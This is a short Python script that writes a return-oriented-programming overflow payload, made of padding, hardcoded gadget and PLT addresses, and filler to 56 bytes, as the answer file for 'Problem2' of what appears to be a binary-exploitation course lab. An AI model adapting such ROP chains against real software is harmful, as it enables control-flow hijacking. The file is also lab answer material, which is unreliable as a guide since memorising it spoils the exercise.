#!/usr/bin/env python3
"""
Generate ans2.txt payload for Problem2.

Usage:
  python3 scripts/generate_ans2.py

Writes a ROP-style payload used in the lab. This script is explicit about
addresses so you can inspect and adapt it.
"""
from pathlib import Path

OUT_PATH = Path(__file__).resolve().parents[1] / "ans2.txt"

def main():
    padding = b"A" * 16
    pop_rdi = (0x4012c7).to_bytes(8, "little")
    rodata_ptr = (0x40203b).to_bytes(8, "little")
    ret_gadget = (0x4012c8).to_bytes(8, "little")
    printf_plt = (0x4010d0).to_bytes(8, "little")
    exit_plt = (0x401120).to_bytes(8, "little")

    payload = padding + pop_rdi + rodata_ptr + ret_gadget + printf_plt + exit_plt
    # memcpy in target copies 0x38 (56) bytes; pad to that length if needed
    if len(payload) < 56:
        payload += b"B" * (56 - len(payload))

    OUT_PATH.write_bytes(payload)
    print(f"wrote {OUT_PATH} ({len(payload)} bytes)")

if __name__ == "__main__":
    main()


